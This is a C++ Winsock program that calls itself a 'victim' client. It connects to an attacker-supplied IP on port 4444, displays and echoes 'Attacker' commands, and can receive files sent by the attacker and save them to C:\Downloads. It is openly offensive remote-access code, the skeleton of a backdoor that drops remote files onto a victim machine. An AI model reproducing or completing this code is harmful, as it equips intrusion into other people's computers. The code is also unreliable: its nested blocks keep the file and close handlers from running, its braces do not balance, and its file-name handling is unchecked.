#include <winsock2.h>
#include <iostream>
#include <ws2tcpip.h>

#define PORT 4444
#define BUFFERSIZE 4096
#define SERVER_STATUS_CLOSED "Connection closed by server"

int main(int argc, char* argv[]) {
    if(argc < 2) {
        std::cout << "Please type: ./victim [IP]\n";
        return 1;
    }
    sockaddr_in serverAddress;
    WSADATA wsa;
    char buffer[BUFFERSIZE];
    SOCKET sock = INVALID_SOCKET;

    if(WSAStartup(MAKEWORD(2, 2), &wsa) != 0) { //ver 2.2
        perror("WSAStartup failed\n");
        return 1;
    } else {
        std::cout << "WSAStartup created\n";
    }

    sock = socket(AF_INET, SOCK_STREAM, 0);
    if(sock == INVALID_SOCKET) {
        perror("Socket failed to create\n");
        WSACleanup();
        return 1;
    } else {
        std::cout << "Socket created\n";
    }

    serverAddress.sin_family = AF_INET;
    serverAddress.sin_port = htons(PORT);
    
    std::string serverip = argv[1];

    if(inet_pton(AF_INET, serverip.c_str(), &serverAddress.sin_addr) <= 0) {
        std::cout << "Invalid ip address\n";
        return 1;
    }

    if(connect(sock, (sockaddr*) &serverAddress, sizeof(serverAddress)) == SOCKET_ERROR) {
        std::cout << "Connection failed\n";
        closesocket(sock);
        WSACleanup();
        return 1;
    } else {
        std::cout << "Connection established\n";
    }

    while(true) {
        int type;
        int bytesRec = recv(sock, (char*)&type, sizeof(type), 0);
        if(bytesRec <= 0) {
            std::cout << SERVER_STATUS_CLOSED;
            break;
        }

        if(type == 1) {
            memset(buffer, 0, BUFFERSIZE);

            bytesRec = recv(sock, buffer, BUFFERSIZE, 0);
            if(bytesRec <= 0) {
                std::cout << SERVER_STATUS_CLOSED;
                break;
            }
        std::string cmd(buffer);
        std::cout << "Attacker: " << cmd << std::endl;

        std::string clientMessage = "\nClient received: " + cmd;
        send(sock, clientMessage.c_str(), clientMessage.size(), 0);
        
        if(type == 2) {
            long fileSize;
            bytesRec = recv(sock, (char*)&fileSize, sizeof(fileSize), 0);
            if(bytesRec < 0 || fileSize < 0) {
                std::cout << "Cannot receive file information\n";
                continue;
            }

            int fileName;
            bytesRec = recv(sock, (char*)&fileName, sizeof(fileName), 0);
            if (bytesRec <= 0) {
                std::cout << "Cannot retrieve file name length\n";
                continue;
            }

            char* fileNameBuffer = new char[fileName + 1];
            bytesRec = recv(sock, fileNameBuffer, fileName, 0);
            fileNameBuffer[fileName] = '\0';
            std::string filename(fileNameBuffer);
            delete[] fileNameBuffer;

            std::string path = "C:\\Downloads\\" + filename;

            std::cout << "File: " << filename << " has " << fileSize << " bytes\n";
            std::cout << "Saving the file to " << path << std::endl;

            FILE* fileOutput = fopen(path.c_str(), "wb");
            if(!fileOutput) {
                std::cout << "Cannot create file\n";
            }

            long dataRec = 0;
            while (dataRec < fileSize) {
                int receive = (fileSize - dataRec > BUFFERSIZE) ? BUFFERSIZE : (fileSize - dataRec);
                bytesRec = recv(sock, buffer, receive, 0);
                if (bytesRec <= 0) {
                    break;
                }
                fwrite(buffer, 1, bytesRec, fileOutput);
                dataRec += bytesRec;
            }

            fclose(fileOutput);
            std::cout << "File received: " << path << std::endl;
        }

        if(type == 3) {
            std::cout << SERVER_STATUS_CLOSED;
            break;
        }
    }
    closesocket(sock);
    WSACleanup();
    return 0;
}